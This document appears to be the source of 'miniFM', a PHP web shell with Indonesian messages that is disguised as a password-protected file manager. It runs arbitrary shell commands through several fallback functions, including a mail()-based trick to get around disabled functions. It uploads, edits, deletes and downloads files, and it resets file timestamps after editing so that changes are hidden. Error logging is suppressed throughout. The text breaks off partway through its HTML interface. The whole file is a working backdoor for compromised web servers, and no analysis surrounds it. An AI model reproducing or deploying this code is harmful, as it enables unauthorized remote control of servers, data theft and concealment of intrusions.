<?php
@ini_set('display_errors','Off');
@ini_set('ignore_repeated_errors',0);
@ini_set('log_errors','Off');
@ini_set('max_execution_time',0);
@ini_set('memory_limit', '128M');
@error_reporting(0);
$auth_pass = '$2a$10$CMnCWptwDEeLiqNXNZHEUeNZJUV2DwnRil3TfqYaJ.CQ493HKQcMy';
$stitle = ".:: [ miniFM ] ::.";
$webprotocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ? "https://" : "http://";
$weburl	= $webprotocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
$lokasiberkas = @getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
if(!isset($_SESSION)){session_start();}
if(!function_exists('array_column')){
	function array_column(array $input, $columnKey, $indexKey = null){
		$array = array();
		foreach($input as $value){
			if(!array_key_exists($columnKey, $value)){
				trigger_error("Key \"$columnKey\" does not exist in array");
				return false;
			}
			if(is_null($indexKey)){
				$array[] = $value[$columnKey];
			} else {
				if(!array_key_exists($indexKey, $value)){
					trigger_error("Key \"$indexKey\" does not exist in array");
					return false;
				}
				if(!is_scalar($value[$indexKey])){
					trigger_error("Key \"$indexKey\" does not contain scalar value");
					return false;
				}
				$array[$value[$indexKey]] = $value[$columnKey];
			}
		}
		return $array;
	}
}
if(!function_exists("scandir")){
	function scandir($dir) {
		$dh = @opendir($dir);
		while (false !== ($filename = @readdir($dh))){
			$files[] = $filename;
		}
		return $files;
	}
}
function disFunc(){
	$disfunc = function_exists("ini_get") ? @ini_get('disable_functions') : '';
	return !empty($disfunc) ? explode(',', $disfunc) : array();
}
function fType($a){
	switch($a){
		case 'dir' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 512 512"><path fill="var(--bg-icon)" d="M0 96C0 60.7 28.7 32 64 32H196.1c19.1 0 37.4 7.6 50.9 21.1L289.9 96H448c35.3 0 64 28.7 64 64V416c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V96zM64 80c-8.8 0-16 7.2-16 16V416c0 8.8 7.2 16 16 16H448c8.8 0 16-7.2 16-16V160c0-8.8-7.2-16-16-16H286.6c-10.6 0-20.8-4.2-28.3-11.7L213.1 87c-4.5-4.5-10.6-7-17-7H64z"/></svg>'; break;
		case 'file' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 384 512"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>'; break;
		default : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 384 512"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>';
	}
	return $b;
}
function procopen($cmd){
	$chunk_size = 4096;
	$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
	);
	try {
		$process = proc_open($cmd, $descriptorspec, $pipes);
		if(is_resource($process)){
			$stdout = ""; $buffer = "";
			do {
				$buffer = fread($pipes[1], $chunk_size);
				$stdout = $stdout . $buffer;
			} while ((!feof($pipes[1])) && (strlen($buffer) != 0));
			$stderr = ""; $buffer = "";
			do {
				$buffer = fread($pipes[2], $chunk_size);
				$stderr = $stderr . $buffer;
			} while ((!feof($pipes[2])) && (strlen($buffer) != 0));
			fclose($pipes[1]);
			fclose($pipes[2]);
			$outr = !empty($stdout) ? $stdout : $stderr;
		} else {
			$outr = 'Gagal eksekusi pak!, proc_open failed!';
			exit(1);
		}
		proc_close($process);
		echo $outr;
	} catch(Exception $err){
		echo 'error: '.$outr->getMessage();
	}
}
function fakemail($func, $cmd){
	global $chunk_size;
	$cmds = $cmd." > geiss.txt";
	cf('geiss.sh', base64_encode(@iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("#!/bin/sh\n{$cmds}","\r\t\0"))));
	chmod('geiss.sh', 0777);
	if($func == 'mail'){
		@mail('', '', '', '', '-H \"exec geiss.sh\"');
	} else {
		@mb_send_mail('', '', '', '', '-H \"exec geiss.sh\"');
	}
	return @file_get_contents('geiss.txt');
}
function cf($f,$t){
	$w=@fopen($f,"w") or @function_exists('file_put_contents');
	if($w){
		@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
		@fclose($w);
	}
}
function expandPath($path) {
    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        procopen("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}
function ex($init, $loc){
	$disfuncs = disFunc();
	$out['data'] = '';
	$cwd = !empty($loc) ? $loc : $lokasiberkas;
	if(preg_match("/^\s*cd\s*(2>&1)?$/", $init)) {
        @chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $init)) {
        @chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $init, $match);
        @chdir(expandPath($match[1]));
	} else {
		@chdir($cwd);
	}
	$cwd = @getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
	$out['path'] = $cwd;
	if(function_exists("proc_open")){
		if(!in_array("proc_open", $disfuncs)){ob_start();procopen($init);$out['data'] = ob_get_clean();}
	} else if(function_exists("exec")){
		if(!in_array("exec", $disfuncs)){@exec($init, $out);$out = @join("\n",$out['data']);}
	} else if(function_exists("passthru")){
		if(!in_array("passthru", $disfuncs)){ob_start();@passthru($init);$out['data'] = ob_get_clean();}
	} else if(function_exists("system")){
		if(!in_array("system", $disfuncs)){ob_start();@system($init);$out['data'] = ob_get_clean();}
	} else if(function_exists("shell_exec")){
		if(!in_array("shell_exec", $disfuncs)){$out['data'] = shell_exec($init);}
	} else if(function_exists("mail")){
		if(!in_array("mail", $disfuncs)){ob_start();fakemail("mail", $init);$out['data'] = ob_get_clean();}
	} else if(function_exists("mb_send_mail")){
		if(!in_array("mb_send_mail", $disfuncs)){ob_start();fakemail("mb_send_mail", $init);$out['data'] = ob_get_clean();;}
	} elseif(is_resource($f = @popen($init, "r"))){
		$out['data']='';while(!@feof($f)){$out['data'] .= fread($f, 4096);}fclose($f);
	} else {
		$out['data'] = "gak bisa jalanin perintah pak!";
	}
	return $out;
}
function statusnya($file){
	$statusnya = @fileperms($file);
	if(($statusnya & 0xC000) == 0xC000){ $info = 's'; /* Socket */ }
	elseif(($statusnya & 0xA000) == 0xA000){ $info = 'l'; /* Symbolic Link */ }
	elseif(($statusnya & 0x8000) == 0x8000){ $info = '-'; /* Regular */ }
	elseif(($statusnya & 0x6000) == 0x6000){ $info = 'b'; /* Block special */ }
	elseif(($statusnya & 0x4000) == 0x4000){ $info = 'd'; /* Directory */ }
	elseif(($statusnya & 0x2000) == 0x2000){ $info = 'c'; /* Character special */ }
	elseif(($statusnya & 0x1000) == 0x1000){ $info = 'p'; /* FIFO pipe */ }
	else { $info = 'u'; /* Unknown */ }
	/* Owner */
	$info .= ($statusnya & 0x0100) ? 'r' : '-';
	$info .= ($statusnya & 0x0080) ? 'w' : '-';
	$info .= (($statusnya & 0x0040) ? (($statusnya & 0x0800) ? 's' : 'x' ) : (($statusnya & 0x0800) ? 'S' : '-'));
	/* Group */
	$info .= ($statusnya & 0x0020) ? 'r' : '-';
	$info .= ($statusnya & 0x0010) ? 'w' : '-';
	$info .= (($statusnya & 0x0008) ? (($statusnya & 0x0400) ? 's' : 'x' ) : (($statusnya & 0x0400) ? 'S' : '-'));
	/* World */
	$info .= ($statusnya & 0x0004) ? 'r' : '-';
	$info .= ($statusnya & 0x0002) ? 'w' : '-';
	$info .= (($statusnya & 0x0001)? (($statusnya & 0x0200) ? 't' : 'x' ) : (($statusnya & 0x0200) ? 'T' : '-'));
	return $info;
}
function owner($filename){
	$disfuncs = disFunc();
	if(!in_array('posix_getpwuid', $disfuncs)){
		if(function_exists("posix_getpwuid")){
			$owner = @posix_getpwuid(fileowner($filename));
			$owner = $owner['name'];
		} else {
			$owner = fileowner($filename);
		}		
	} else {
		$owner = '?';		
	}
	if(!in_array('posix_getgrgid', $disfuncs)){
		if(function_exists("posix_getgrgid")){
			$group = @posix_getgrgid(filegroup($filename));
			$group = $group['name'];
		} else {
			$group = filegroup($filename);
		}
	} else {
		$group = '?';		
	}
	return array('owner' => $owner, 'group' => $group);
}
function sizeFilter($bytes){
    $label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
    for($i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++);
    return(round($bytes, 2) . " " . $label[$i]);
}
function countDir($filename){
	return @count(@scandir($filename)) - 2;
}
function xrmdir($dir){
	$items = @scandir($dir);
	if($items){
		foreach($items as $item) {
			if($item === '.' || $item === '..'){
				continue;
			}
			$path = $dir.'/'.$item;
			if(@is_dir($path)){
				xrmdir($path);
			} else {
				@unlink($path);
			}
		}
		rmdir($dir);
	}
}
function urutberkas($a){
	$b = @scandir($a);
	$i = array();
	if(is_array($b) && count($b)>0){
		foreach($b as $v){
			$dir = $a.'/'.$v;
			if(@is_dir($dir) && !in_array($v, array('.', '..'))){
				$i[] = array('type' => 'dir', 'entry' => $v, 'entry_path' => $a, 'full_path' => $dir);
			} else {
				if(!in_array($v, array('.', '..'))){
					$i[] = array('type' => 'file', 'entry' => $v, 'entry_path' => $a, 'full_path'=> $dir);
				}
			}
		}
	}
	$col1 = array_column($i, 'type');
	$col2 = array_column($i, 'entry');
	array_multisort($col1, SORT_ASC, $col2, SORT_ASC, $i);
	return $i;
}
function pathberkas($a){
	$lokasiberkas = explode('/', $a);
	if(isset($lokasiberkas) && count($lokasiberkas)>0){
		$outs = '<nav aria-label="breadcrumb" class="d-flex justify-content-center align-items-center mt-n3">';
		$outs .= '<button id="ffmanager" class="border-0 bg-transparent d-block text-success mr-2 px-1" data-path="'.(@getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT']).'"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg></button>';
		$outs .= '<ol class="breadcrumb w-100" style="margin-top:revert;">';
		foreach($lokasiberkas as $id => $lok){
			if($lok == '' && $id == 0){
				$link = true;
				$outs .= '<li class="breadcrumb-item"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="/">~$</a></li>';
				continue;
			}
			if($lok == ''){continue;}
			$outs .= '<li class="breadcrumb-item dir'.$id.'"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="';
			for($i=0;$i<=$id;$i++){
				$outs .= $lokasiberkas[$i];
				if($i != $id){
					$outs .= '/';
				}
			}
			$outs .= '">'.$lok.'</a></li>';
		}
		$outs .= "</ol></nav>";
	} else {
		$outs = "<code>gak bisa baca direktori ini gess..</code>";
	}
	return $outs;
}
function filemanager($fm){
	$lokasinya = urutberkas($fm);
	$fmtable = "<div class='d-block'>".pathberkas($fm)."</div><div class='table-responsive'>";
	$fmtable .= "<table class='table table-sm w-100 mb-0'>
		<thead class='bg-dark text-light'>
			<tr>
				<th class='text-center' style='min-width:150px;'>Name</th>
				<th class='text-center' style='min-width:100px;'>Creates</th>
				<th class='text-center' style='min-width:125px;'>User / Group</th>
				<th class='text-center' style='min-width:100px;'>Perm</th>
				<th class='text-center' style='min-width:90px;'>Options</th>
			</tr>
		</thead>
		<tbody>";
	if(count($lokasinya)>0){
		foreach($lokasinya as $kl => $dir){
			$owner = owner($dir['full_path']);
			$fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(filesize($dir['full_path']));
			if($dir['type'] == 'dir'){
				$txcol = @is_writable($dir['full_path']) ? 'text-success' : 'text-danger';
				$dlinks = !is_readable($dir['full_path']) ? $dir['entry'] : "<a href='#!' class='{$txcol}' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>";
				$formsel = "";
				$formper = statusnya($dir['full_path']);
				if(!in_array($dir['entry'], array('.', '..'))){
					$formper = "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
					$formsel = "<select class='custom-select custom-select-sm border-success' id='showaksi'>
						<option value=''></option>
						<option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option>
						<option value='zip' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>
						<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option>
					</select>";
				}
				$fmtable .= "<tr>
					<td class='text-left align-middle'>
						<div class='media dir'>".fType('dir')."<div class='media-body'>{$dlinks}<span class='fsmall'>{$fSize}</span></div></div>
					</td>
					<td class='text-center align-middle'>".date('d M Y H:i:s', filemtime($dir['full_path']))."</td>
					<td class='text-center align-middle'>{$owner['owner']} / {$owner['group']}</td>
					<td class='text-center align-middle'>{$formper}</td>
					<td class='text-center align-middle'>{$formsel}</td>
				</tr>";
			} else {
				$fcolor = @is_writable($dir['full_path']) ? 'text-success' : 'text-danger';
				$flinks = !is_readable($dir['full_path']) ? $dir['entry'] : "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
				$fmtable .= "<tr>
					<td class='text-left align-middle'>
						<div class='media file'>".fType('file')."<div class='media-body'>{$dir['entry']}<span class='fsmall'>{$fSize}</span></div></div>
					</td>
					<td class='text-center align-middle'>".date('d M Y H:i:s', filemtime($dir['full_path']))."</td>
					<td class='text-center align-middle'>{$owner['owner']} / {$owner['group']}</td>
					<td class='text-center align-middle'>{$flinks}</td>
					<td class='text-center align-middle'>
						<select class='custom-select custom-select-sm border-success' id='showaksi'>
							<option value=''></option>
							<option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option>
							<option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option>
							<option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option>
							<option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option>
							<option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option>
						</select>
					</td>
				</tr>";
			}
		}
	} else {
		$fmtable .= "<tr><td class='text-center' colspan='5'>Direktori tidak berisi file apapun</td></tr>";
	}
	$fmtable .= "</tbody></table></div>";
	return $fmtable;
}
if(isset($_GET['act'])){
	if($_GET['act'] == 'command'){
		if(isset($_POST['cmd']) && !empty($_POST['cmd'])){
			$sendreq = ex($_POST['cmd'], $_POST['xpath']);
			$outs = base64_encode(@iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("~$ ".$_POST['cmd'] . "<br/>" . $sendreq['data']."","\t\0")));
			echo "<input type='hidden' name='xpath' value='{$sendreq['path']}'/>";
			echo "<pre class='pb-0 mb-0'>".base64_decode($outs)."</pre>";
			die();
		}
	} else if($_GET['act'] == 'mkdir'){
		$ndir = isset($_POST['xdir']) && !empty($_POST['xdir']) ? $_POST['xdir'] : '';
		if(!empty($ndir)){
			$xpath = $_POST['xpath']."/".$ndir;
			if($_POST['xtype'] == 'dir'){
				if(!is_dir($xpath)){
					if(@mkdir($xpath, 0755, true)){
						$outs = "Direktori berhasil dibuat!";
					} else {
						$sendreq = ex("mkdir ".$xpath, $_POST['xpath']);
						$outs = @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes($sendreq['data'])) ? "Direktori berhasil dibuat!" : "Gagal membuat direktori!";
					}
				} else {
					$outs = "Direktori sudah ada!";
				}
			} else {
				if($_POST['xtype'] == 'file'){
					if(!file_exists($xpath)){
						$fp = @fopen($xpath, 'w');
						if($fp){
							$xpath = "ok, tinggal di edit..";
							fclose($fp);
						}
						$outs = "File berhasil dibuat!";
					} else {
						$outs = "Gagal membuat file!";
					}
				} else {
					$outs = "Anda mw buat apa??";
				}
			}
		} else {
			$outs = "Path tidak valid!";
		}
		echo "<code>{$outs}</code>";
		die();
	} else if($_GET['act'] == 'readfile'){
		if(isset($_POST['xpath']) && !empty($_POST['xpath'])){
			$xpath = $_POST['xpath'];			
			if(@is_readable($xpath)){
				$outs = '';
				$fp = @fopen($xpath, 'r');
				if($fp){
					while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}
					@fclose($fp);
				}
			} else {
				$outs = "File ini gak bisa dibaca!";
			}
		} else {
			$outs = "File yang mw dibaca, gk ada!";
		}
		echo $outs;
		die();
	} else if($_GET['act'] == 'upload'){
		@ini_set('output_buffering', 0);
		$xpath = $_POST['xpath'];
		$lawlx = @$_FILES['xfile'];
		$upfiles = @file_put_contents($xpath."/".$lawlx['name'], @file_get_contents($lawlx['tmp_name']));
		if($upfiles){
			$outs = file_exists($xpath."/".$lawlx['name']) ? "uploaded!" : "failed";
		} else {
			$outs = "failed";
		}
		echo "<code>{$outs}</code>";
		die();
	} else if($_GET['act'] == 'rename'){
		if(isset($_POST['xtype'], $_POST['xpath'], $_POST['xname'], $_POST['oname'])){
			$ren = @rename($_POST['xpath'].'/'.$_POST['oname'], $_POST['xpath'].'/'.$_POST['xname']);
			$outss = $ren == true ? 'Berhasil mengubah nama '.$_POST['xtype'] : 'Gagal mengubah nama '.$_POST['xtype'];
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'chmod'){
		if(isset($_POST['xperm']) && !empty($_POST['xperm'])){
			$xperm = $_POST['xperm'];
			$xtype = $_POST['xtype'];
			$xname = $_POST['xname'];
			$xpath = $_POST['xpath'];
			$perms = 0;
			for($i=strlen($xperm)-1;$i>=0;--$i){
				$perms += (int)$xperm[$i]*pow(8, (strlen($xperm)-$i-1));
			}
			$cm = @chmod("{$xpath}/{$xname}", $perms);
			$outss = $cm == true ? 'chmod '.$xtype.': '.$xname.', berhasil!' : 'chmod '.$xtype.': '.$xname.', gagal!';
		} else {
			$outss = 'Permission tidak boleh kosong!';
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'del'){
		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'])){
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			if(@is_dir($df)){
				xrmdir($df);
				$outss = file_exists($df) ? "Hapus dir gagal!" : "Hapus dir sukses!";
			} else if(@is_file($df)){
				@unlink($df);
				$outss = file_exists($df) ? "Hapus file gagal!" : "Hapus file sukses!";
			}
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'zip'){
		if(class_exists('ZipArchive')) {
			$zip = new ZipArchive();
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			if($zip->open($df.'.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
				$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($df), RecursiveIteratorIterator::LEAVES_ONLY);
				foreach ($files as $file){
					if (!$file->isDir()){
						$filePath = $file->getRealPath();
						$relativePath = substr($filePath, strlen($df) + 1);
						$zip->addFile($filePath, $relativePath);
					}
				}
				$outss = 'sukses pak!';
			} else {
				$outss = 'Tidak dapat menganalisa dir/file';
			}
			$zip->close();
		} else {
			$outss = 'module ZipArchive tidak terinstall';
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'path'){
		$dirs = isset($_GET['dir']) && !empty($_GET['dir']) ? $_GET['dir'] : $lokasiberkas;
		if(isset($_GET['opt'], $_GET['entry'])){
			$df = $dirs .'/'. $_GET['entry'];
			if($_GET['opt'] == 'newfile'){
				$xdata = isset($_POST['xdata']) ? base64_decode($_POST['xdata']) : '';
				$fp = @fopen($df, 'w');
				if($fp){
					@fwrite($fp, $xdata);
					@fclose($fp);
					$dout = "File berhasil dibuat!";
				} else {
					$dout = "File gagal dibuat!";
				}
			} else if($_GET['opt'] == 'edit'){
				if(isset($_POST['xdata'])){
					$_POST['xdata'] = base64_decode($_POST['xdata']);
					$time = @filemtime($df);
					$fp = @fopen($df, 'w');
					if($fp){
						@fwrite($fp, $_POST['xdata']);
						@fclose($fp);
						$dout = "File berhasil di-edit!";
						@touch($df, $time, $time);
					} else {
						$dout = "File gagal di-edit!";
					}
				} else {
					if(!is_writable($df)){
						$dout = "disini gk bisa membuat file atau direktori!";
					} else {
						$dout = "";
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, @filesize($df)));}
							@fclose($fp);
						}
					}
				}
			} else if($_GET['opt'] == 'download'){
				if(isset($_GET['dir'], $_GET['entry'])){
					$df = $_GET['dir'] .'/'. $_GET['entry'];
					if(@is_file($df) && @is_readable($df)){
						header('Pragma: public');
						header('Expires: 0');
						header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); 
						header('Content-Type: application/force-download');
						header('Content-Type: application/download');
						header('Content-Type: '.(function_exists('mime_content_type') ? @mime_content_type($df) : 'application/octet-stream'));
						header('Content-Description: File Transfer');
						header('Content-Disposition: attachment; filename='.basename($df));
						header('Content-Length: '.@filesize($df));
						header('Content-Transfer-Encoding: binary');
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)) echo @fread($fp, @filesize($df));
							fclose($fp);
						}
						exit();
					} else {
						echo "File tidak dapat di download!'"; exit();
					}
				} else {
					echo "Tidak ada file yang dipilih!"; exit();
				}
			} else {
				$dout = '';
				$fp = @fopen($df, 'r');
				if($fp){
					while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, @filesize($df)));}
					@fclose($fp);
				}				
			}
			echo $dout;
		} else {
			echo filemanager($dirs);
		}
		die();
	} else if($_GET['act'] == 'logout'){
		unset($_SESSION['auth']);
		header('location: '.$_SERVER['PHP_SELF']);
		exit();
	}
}
if(isset($_POST['xpass'])){
	if(password_verify($_POST['xpass'], $auth_pass)){
		$_SESSION['auth'] = $auth_pass;
		header('location: '.$_SERVER['PHP_SELF']);
		exit();
	} else {
		$statusLogin[] = 'wrong password :(';
	}
}
if(!isset($_SESSION['auth'])){
	echo "<html>
		<head><meta name='viewport' content='width=device-width, initial-scale=1'/><title>Restricted area</title><link rel='preconnect' href='https://fonts.googleapis.com'><link rel='preconnect' href='https://fonts.gstatic.com' crossorigin/><link href='https://fonts.googleapis.com/css2?family=Montserrat:ital@0;1&display=swap' rel='stylesheet'/></head>
		<body style='font-family: \"Montserrat\", sans-serif;'>
			<form action='' method='post'>
				<fieldset style='background-color:#eeeeee; border-radius:.3em; border:.5px solid #0066b6;'>
					<legend style='background-color:#0066b6; color:#fff; padding:5px 10px; border-radius:.3em;'>auth login:</legend>
					<label for='xpass'>pwd:</label>
					<input type='password' id='xpass' name='xpass' style='margin:5px; padding:5px 10px; border-radius:.3em; border:.5px solid #0066b6;'></input><input type='submit' value='GO' style='background-color:#0066b6; color:#fff; margin:5px; padding:5px 10px; border-radius:.3em; border:0;'></input>
					".(isset($statusLogin) ? "<br/><small style='color:#ff0000; font-style:italic;'>{$statusLogin[0]}</small>" : "")."
				</fieldset>
			</form>
		</body>
	</html>";
	die();
} else {
?>
<!doctype html>
<html lang="en" class="bg-dark h-100">
	<head>
		<meta charset="utf-8"/>
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
		<link rel="shortcut icon" href="https://clipart-library.com/data_images/554935.png"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
		<title><?php echo $stitle;?></title>
		<style>
		:root{
			--bg-icon: #149232;
			--bg-success: #00d433;
			--bs-success-rgb: 0, 212, 51;
			--bs-danger-rgb: 220, 53, 69;
		}
		html,body{background:#2b2f34;}
		body button{color:#eee;}
		body, .blockquote{font-size:1em;}
		body {padding-top: 5.25rem; color:#ddd;}
		input{font-size:1em !important;}
		nav .nav-tabs{border-bottom:1px solid #0066b6;}
		nav .nav-tabs .nav-link.active{background:#0066b6; color:#fff;}
		nav .nav-tabs .nav-link.active svg path{fill:#ffffff !important;}
		nav .nav-tabs .nav-link:hover, nav .nav-tabs .nav-link:focus, nav .nav-tabs .nav-link.active{border:1px solid #0066b6;}
		table {border-radius:10px;}
		table td, table th{border-top:1px solid #444c54 !important;}
		table tr:nth-child(odd){background:rgb(var(--bs-success-rgb), 5%);}
		table thead th {background:rgb(var(--bs-success-rgb), 20%); border-top:0px solid #eee !important; border-bottom:2px solid var(--bg-success) !important;}
		table thead tr th:first-child{border-top-left-radius:.25rem;}
		table thead tr th:last-child{border-top-right-radius:.25rem;}
		table tbody {color:#cfdce8;}
		table tbody tr:hover td{color:#fff;transition: 0.3s;}
		table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%);}
		.breadcrumb{background:linear-gradient(45deg, rgb(var(--bs-success-rgb),20%), transparent);padding:2px 10px;}
		.breadcrumb-item a{color:#cfdce8;}
		.breadcrumb-item a:hover{color:var(--bg-success);}
		.breadcrumb-item+.breadcrumb-item{padding-left:.2rem;}
		.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem;}
		.form-control-sm{height:auto;}
		.form-control:disabled, .form-control[readonly]{background:#272c31; color:#767676;}
		.media.dir svg{margin:auto;padding-right:.5em;}
		.media.file svg{margin:auto;padding:0 .7em 0 .25em;}
		.fsmall{display:block;font-size:1.75vh; color:#61aa64;}
		.input-group-prepend *, .bg-success-rgb{background:rgb(var(--bs-success-rgb),30%); border:1px solid rgb(var(--bs-success-rgb),50%); color:rgb(var(--bs-success-rgb),90%);}
		input[type="text"],input[type="text"]:focus,input[type="text"]:active{background:#343a40; color:#cfdce8;}
		.custom-select{padding:5px 10px;color:#cfdce8;background:#343a40 url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat;}
		.custom-file * {background:#343a40; color:#cfdce8; border:1px solid rgb(var(--bs-success-rgb),50%);}
		#hasilcommand * {background:#343a40; color:#cfdce8;}
		#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%);}
		#hasilcommand .card .card-body{border-radius:.25rem;}
		.text-success{color:rgb(0,212,51,90%) !important; color:#eee;}
		@media screen and (max-width: 420px) {
			nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em;}
			.btn{padding:0px 10px!important;}
		}
		@media screen and (max-width: 767px){
			.container{max-width:100% !important;}
			body, .btn, .blockquote, .input-group-text{font-size:.8em !important;}
			.fsmall{font-size:1.5vh;}
			.form-control-sm{font-size:initial; height:auto;}
			.custom-select{font-size:inherit; height:auto !important;}
			.custom-file, .custom-file-input, .custom-file-label{height:calc(1.5em + .75rem) !important;}
		}
		</style>
	</head>
	<body class="text-monospace">
		<header class="header bg-dark fixed-top mt-auto py-3">
			<div class="container text-center my-2">
				<span class="text-light"><?php echo $stitle;?></span>
			</div>
		</header>
		<div class="container">
			<div class="alert bg-success-rgb text-monospace small py-1 px-2 text-center"><?php echo @php_uname();?></div>
			<nav>
				<div class="nav nav-tabs" id="nav-tab" role="tablist">
					<button class="nav-link active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" data-tempdir="<?php echo $lokasiberkas;?>" type="button" role="tab" aria-controls="nav-berkas" aria-selected="true">
